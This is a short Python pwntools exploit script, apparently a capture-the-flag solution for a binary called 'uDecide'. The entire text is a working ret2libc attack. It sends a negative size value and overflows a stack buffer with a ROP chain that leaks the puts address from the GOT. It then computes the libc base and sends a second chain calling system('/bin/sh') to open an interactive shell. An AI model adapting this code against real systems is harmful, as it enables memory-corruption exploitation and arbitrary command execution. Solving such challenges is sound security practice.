from pwn import *

context.terminal = "tmux splitw -h".split()
context.binary = elf = ELF('uDecide')
libc = elf.libc
p = elf.process()
#gdb.attach(p)

prdi = 0x00000000004013d3
payload = cyclic(40) + p64(prdi) + p64(elf.got.puts) + p64(elf.sym.puts) + p64(elf.sym.main)
p.sendlineafter(b': ',b'-1')
p.sendlineafter(b': ', payload)
p.recvline()
p.recvline()
leak = unpack(p.recvline().strip(),'all')
libc.address = leak - libc.sym.puts

print(hex(libc.address))

payload = cyclic(40) + p64(prdi) + p64(next(libc.search(b'/bin/sh\x00'))) + p64(prdi+1)*9 + p64(libc.sym.system)
p.sendlineafter(b': ', b'-1')
p.sendlineafter(b': ', payload)
p.interactive()
